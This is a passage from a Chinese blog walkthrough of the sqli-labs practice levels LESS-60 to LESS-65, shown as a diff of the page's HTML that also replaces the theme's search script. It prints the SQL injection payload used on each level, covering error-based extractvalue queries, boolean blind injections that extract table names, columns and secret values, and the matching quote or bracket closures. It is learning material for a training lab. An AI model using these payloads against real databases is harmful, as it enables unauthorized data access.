+      <p>改变闭合方式<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot;) and extractvalue(1,concat(0x5c,(select database())))%23</span><br></pre></td></tr></table></div></figure></p>
+
+        <h1 id="LESS-61">
+          <a href="#LESS-61" class="heading-link"><i class="fas fa-link"></i></a>LESS-61</h1>
+      <p>双引号闭合，有点奇葩<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;)) and extractvalue(1,concat(0x5c,(select database())))--+</span><br></pre></td></tr></table></div></figure></p>
+
+        <h1 id="LESS-62">
+          <a href="#LESS-62" class="heading-link"><i class="fas fa-link"></i></a>LESS-62</h1>
+      <p>本题没有错误回显，无法union注入，而且注释符貌似也被过滤了，可以考虑盲注<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and length(database())&#x3D;10 and &#39;a&#39;&#x3D;&#39;a</span><br></pre></td></tr></table></div></figure><br>爆表名<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database()),1,1))&#x3D;54 and &#39;a&#39;&#x3D;&#39;a</span><br></pre></td></tr></table></div></figure><br>爆列名<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;64r31rkgr6&#39;),2,1))&#x3D;100 and &#39;a&#39;&#x3D;&#39;a</span><br></pre></td></tr></table></div></figure><br>爆数据<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and ascii(substr((select secret_R69X from 64r31rkgr6 ),1,1))&#x3D;121 and &#39;a&#39;&#x3D;&#39;a</span><br></pre></td></tr></table></div></figure></p>
+<p>但是查看源代码发现这并非本关的闭合方式，闭合的话应该是<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;) and length(database())&#x3D;10%23</span><br></pre></td></tr></table></div></figure><br>但是我的payload也是可以的，原因在于)将我的输入闭合了，这也说明了为什么在我的原payload中不能使用注释符的原因。</p>
+
+        <h1 id="LESS-63">
+          <a href="#LESS-63" class="heading-link"><i class="fas fa-link"></i></a>LESS-63</h1>
+      <p>单引号闭合<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;%23</span><br></pre></td></tr></table></div></figure></p>
+
+        <h1 id="LESS-64">
+          <a href="#LESS-64" class="heading-link"><i class="fas fa-link"></i></a>LESS-64</h1>
+      <p>双括号闭合<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1))%23</span><br></pre></td></tr></table></div></figure></p>
+
+        <h1 id="LESS-65">
+          <a href="#LESS-65" class="heading-link"><i class="fas fa-link"></i></a>LESS-65</h1>
+      <p>payload<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot;)%23</span><br></pre></td></tr></table></div></figure></p>
+
+        <h1 id="后记">
+          <a href="#后记" class="heading-link"><i class="fas fa-link"></i></a>后记</h1>
+      <p>总算是把所有的关都做完了，本次感慨良多啊。刚开始的时候还特别有激情，后面就不想做了，直到有一天，我制定了一个计划，一天5关，终于坚持下来了，看来做什么事情都要有个计划呀。做完后还是学到了很多的东西的，剩下的话还要练习一下写盲注脚本。</p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://chaosec.top">Aesm1p</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://chaosec.top/2018/03/05/sqli-labs3/">http://chaosec.top/2018/03/05/sqli-labs3/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://chaosec.top/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></span></div><div class="post-reward reward"><div class="reward-button">Buy me a coffee</div><div class="reward-qrcode"><span class="reward-qrcode-alipay"><img class="reward-qrcode-alipay__img" src="/assets/reward-alipay.jpg"><div class="reward-qrcode-alipay__text">Alipay</div></span><span class="reward-qrcode-wechat"><img class="reward-qrcode-wechat__img" src="/assets/reward-wechat.png"><div class="reward-qrcode-wechat__text">Wechat</div></span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2018/03/12/bugkuwriteup/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">BUGKU-CTF题解</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2018/02/18/mysql7/"><span class="paginator-prev__text">MySQL学习笔记(七)</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2020</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Aesm1p</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
   }
-</script>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-    
-    
-  
-  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
-
-
-
-  
-  
-
-
-
-
-
-
-
-
-
-
-
-  
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-  
-  <script src="/lib/three/three.min.js"></script>
-
-  
-  <script src="/lib/three/three-waves.min.js"></script>
-
-
-  
-
-
-  <script src="/js/src/utils.js?v=6.7.0"></script>
-
-  <script src="/js/src/motion.js?v=6.7.0"></script>
-
-
-
-  
-  
-
-
-  <script src="/js/src/affix.js?v=6.7.0"></script>
-
-  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>
-
-
-
-
-  
-  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
-<script src="/js/src/post-details.js?v=6.7.0"></script>
-
-
-
-  
-
-
-  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
-
-
-
-  
-
-
-  
-
-
-  
-
-  <script>
-    // Popup Window;
-    var isfetched = false;
-    var isXml = true;
-    // Search DB path;
-    var search_path = "search.xml";
-    if (search_path.length === 0) {
-      search_path = "search.xml";
-    } else if (/json$/i.test(search_path)) {
-      isXml = false;
-    }
-    var path = "/" + search_path;
-    // monitor main search box;
-
-    var onPopupClose = function (e) {
-      $('.popup').hide();
-      $('#local-search-input').val('');
-      $('.search-result-list').remove();
-      $('#no-result').remove();
-      $(".local-search-pop-overlay").remove();
-      $('body').css('overflow', '');
-    }
-
-    function proceedsearch() {
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
-        .css('overflow', 'hidden');
-      $('.search-popup-overlay').click(onPopupClose);
-      $('.popup').toggle();
-      var $localSearchInput = $('#local-search-input');
-      $localSearchInput.attr("autocapitalize", "none");
-      $localSearchInput.attr("autocorrect", "off");
-      $localSearchInput.focus();
-    }
-
-    // search function;
-    var searchFunc = function(path, search_id, content_id) {
-      'use strict';
-
-      // start loading animation
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
-          '<div id="search-loading-icon">' +
-          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
-          '</div>' +
-          '</div>')
-        .css('overflow', 'hidden');
-      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
-
-      
-
-      $.ajax({
-        url: path,
-        dataType: isXml ? "xml" : "json",
-        async: true,
-        success: function(res) {
-          // get the contents from search data
-          isfetched = true;
-          $('.popup').detach().appendTo('.header-inner');
-          var datas = isXml ? $("entry", res).map(function() {
-            return {
-              title: $("title", this).text(),
-              content: $("content",this).text(),
-              url: $("url" , this).text()
-            };
-          }).get() : res;
-          var input = document.getElementById(search_id);
-          var resultContent = document.getElementById(content_id);
-          var inputEventFunction = function() {
-            var searchText = input.value.trim().toLowerCase();
-            var keywords = searchText.split(/[\s\-]+/);
-            if (keywords.length > 1) {
-              keywords.push(searchText);
-            }
-            var resultItems = [];
-            if (searchText.length > 0) {
-              // perform local searching
-              datas.forEach(function(data) {
-                var isMatch = false;
-                var hitCount = 0;
-                var searchTextCount = 0;
-                var title = data.title.trim();
-                var titleInLowerCase = title.toLowerCase();
-                var content = data.content.trim().replace(/<[^>]+>/g,"");
-                
-                var contentInLowerCase = content.toLowerCase();
-                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
-                var indexOfTitle = [];
-                var indexOfContent = [];
-                // only match articles with not empty titles
-                if(title != '') {
-                  keywords.forEach(function(keyword) {
-                    function getIndexByWord(word, text, caseSensitive) {
-                      var wordLen = word.length;
-                      if (wordLen === 0) {
-                        return [];
-                      }
-                      var startPosition = 0, position = [], index = [];
-                      if (!caseSensitive) {
-                        text = text.toLowerCase();
-                        word = word.toLowerCase();
-                      }
-                      while ((position = text.indexOf(word, startPosition)) > -1) {
-                        index.push({position: position, word: word});
-                        startPosition = position + wordLen;
-                      }
-                      return index;
-                    }
-
-                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
-                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
-                  });
-                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
-                    isMatch = true;
-                    hitCount = indexOfTitle.length + indexOfContent.length;
-                  }
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ Untitled ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
                 }
 
-                // show search results
-
-                if (isMatch) {
-                  // sort index by position of keyword
-
-                  [indexOfTitle, indexOfContent].forEach(function (index) {
-                    index.sort(function (itemLeft, itemRight) {
-                      if (itemRight.position !== itemLeft.position) {
-                        return itemRight.position - itemLeft.position;
-                      } else {
-                        return itemLeft.word.length - itemRight.word.length;
-                      }
-                    });
-                  });
-
-                  // merge hits into slices
-
-                  function mergeIntoSlice(text, start, end, index) {
-                    var item = index[index.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    var hits = [];
-                    var searchTextCountInSlice = 0;
-                    while (position + word.length <= end && index.length != 0) {
-                      if (word === searchText) {
-                        searchTextCountInSlice++;
-                      }
-                      hits.push({position: position, length: word.length});
-                      var wordEnd = position + word.length;
-
-                      // move to next position of hit
-
-                      index.pop();
-                      while (index.length != 0) {
-                        item = index[index.length - 1];
-                        position = item.position;
-                        word = item.word;
-                        if (wordEnd > position) {
-                          index.pop();
-                        } else {
-                          break;
-                        }
-                      }
-                    }
-                    searchTextCount += searchTextCountInSlice;
-                    return {
-                      hits: hits,
-                      start: start,
-                      end: end,
-                      searchTextCount: searchTextCountInSlice
-                    };
-                  }
-
-                  var slicesOfTitle = [];
-                  if (indexOfTitle.length != 0) {
-                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
-                  }
-
-                  var slicesOfContent = [];
-                  while (indexOfContent.length != 0) {
-                    var item = indexOfContent[indexOfContent.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    // cut out 100 characters
-                    var start = position - 20;
-                    var end = position + 80;
-                    if(start < 0){
-                      start = 0;
-                    }
-                    if (end < position + word.length) {
-                      end = position + word.length;
-                    }
-                    if(end > content.length){
-                      end = content.length;
-                    }
-                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
-                  }
-
-                  // sort slices in content by search text's count and hits' count
-
-                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
-                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
-                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
-                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
-                      return sliceRight.hits.length - sliceLeft.hits.length;
-                    } else {
-                      return sliceLeft.start - sliceRight.start;
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
                     }
                   });
-
-                  // select top N slices in content
-
-                  var upperBound = parseInt('1');
-                  if (upperBound >= 0) {
-                    slicesOfContent = slicesOfContent.slice(0, upperBound);
-                  }
-
-                  // highlight title and content
-
-                  function highlightKeyword(text, slice) {
-                    var result = '';
-                    var prevEnd = slice.start;
-                    slice.hits.forEach(function (hit) {
-                      result += text.substring(prevEnd, hit.position);
-                      var end = hit.position + hit.length;
-                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
-                      prevEnd = end;
-                    });
-                    result += text.substring(prevEnd, slice.end);
-                    return result;
-                  }
-
-                  var resultItem = '';
-
-                  if (slicesOfTitle.length != 0) {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
-                  } else {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
-                  }
-
-                  slicesOfContent.forEach(function (slice) {
-                    resultItem += "<a href='" + articleUrl + "'>" +
-                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
-                      "...</p>" + "</a>";
-                  });
-
-                  resultItem += "</li>";
-                  resultItems.push({
-                    item: resultItem,
-                    searchTextCount: searchTextCount,
-                    hitCount: hitCount,
-                    id: resultItems.length
-                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                 }
-              })
-            };
-            if (keywords.length === 1 && keywords[0] === "") {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
-            } else if (resultItems.length === 0) {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
-            } else {
-              resultItems.sort(function (resultLeft, resultRight) {
-                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
-                  return resultRight.searchTextCount - resultLeft.searchTextCount;
-                } else if (resultLeft.hitCount !== resultRight.hitCount) {
-                  return resultRight.hitCount - resultLeft.hitCount;
-                } else {
-                  return resultRight.id - resultLeft.id;
-                }
-              });
-              var searchResultList = '<ul class=\"search-result-list\">';
-              resultItems.forEach(function (result) {
-                searchResultList += result.item;
-              })
-              searchResultList += "</ul>";
-              resultContent.innerHTML = searchResultList;
-            }
-          }
-
-          if ('auto' === 'auto') {
-            input.addEventListener('input', inputEventFunction);
-          } else {
-            $('.search-icon').click(inputEventFunction);
-            input.addEventListener('keypress', function (event) {
-              if (event.keyCode === 13) {
-                inputEventFunction();
+                return result;
               }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
             });
-          }
 
-          // remove loading animation
-          $(".local-search-pop-overlay").remove();
-          $('body').css('overflow', '');
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
 
-          proceedsearch();
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
         }
       });
     }
+  });
+}
 
-    // handle and trigger popup window;
-    $('.popup-trigger').click(function(e) {
-      e.stopPropagation();
-      if (isfetched === false) {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-      } else {
-        proceedsearch();
-      };
-    });
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
 
-    $('.popup-btn-close').click(onPopupClose);
-    $('.popup').click(function(e){
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
       e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
     });
-    $(document).on('keyup', function (event) {
-      var shouldDismissSearchPopup = event.which === 27 &&
-        $('.search-popup').is(':visible');
-      if (shouldDismissSearchPopup) {
-        onPopupClose();
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
       }
     });
-  </script>
+  };
 
-
-
-
-
-  
-
-  
-
-  
-
-  
-
-  
-  
-
-  
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-  <style>
-    .copy-btn {
-      display: inline-block;
-      padding: 6px 12px;
-      font-size: 13px;
-      font-weight: 700;
-      line-height: 20px;
-      color: #333;
-      white-space: nowrap;
-      vertical-align: middle;
-      cursor: pointer;
-      background-color: #eee;
-      background-image: linear-gradient(#fcfcfc, #eee);
-      border: 1px solid #d5d5d5;
-      border-radius: 3px;
-      user-select: none;
-      outline: 0;
-    }
-
-    .highlight-wrap .copy-btn {
-      transition: opacity .3s ease-in-out;
-      opacity: 0;
-      padding: 2px 6px;
-      position: absolute;
-      right: 4px;
-      top: 8px;
-    }
-
-    .highlight-wrap:hover .copy-btn,
-    .highlight-wrap .copy-btn:focus {
-      opacity: 1
-    }
-
-    .highlight-wrap {
-      position: relative;
-    }
-  </style>
-  <script>
-    $('.highlight').each(function(i, e) {
-      var $wrap = $('<div>').addClass('highlight-wrap');
-      $(e).after($wrap);
-      $wrap.append($('<button>').addClass('copy-btn').append('Copy').on('click', function(e) {
-        var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
-          return $(e).text();
-        }).toArray().join('\n');
-        var ta = document.createElement('textarea');
-        var range = document.createRange(); //For Chrome
-        var sel = window.getSelection(); //For Chrome
-        var yPosition = window.pageYOffset || document.documentElement.scrollTop;
-        ta.style.top = yPosition + 'px'; //Prevent page scroll
-        ta.style.position = 'absolute';
-        ta.style.opacity = '0';
-        ta.value = code;
-        ta.textContent = code; //For FireFox
-        ta.contentEditable = true;
-        ta.readOnly = false;
-        document.body.appendChild(ta);
-        range.selectNode(ta);
-        sel.removeAllRanges();
-        sel.addRange(range);
-        ta.setSelectionRange(0, code.length);
-        var result = document.execCommand('copy');
-        
-        ta.blur(); //For iOS
-        $(this).blur();
-      })).on('mouseleave', function(e) {
-        var $b = $(this).find('.copy-btn');
-        setTimeout(function() {
-          $b.text('Copy');
-        }, 300);
-      }).append(e);
-    })
-  </script>
-
-
-  
-
-  <script type="text/javascript" src="/js/src/dynamic_bg.js"></script>
-  <!-- 页面点击小红心 -->
-  <script type="text/javascript" src="/js/src/clicklove.js"></script>
-</body>
-</html>
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);</script><script src="/js/utils.js?v=2.1.1"></script><script src="/js/stun-boot.js?v=2.1.1"></script><script src="/js/scroll.js?v=2.1.1"></script><script src="/js/header.js?v=2.1.1"></script><script type="application/json" src="/search.json"></script></body></html>
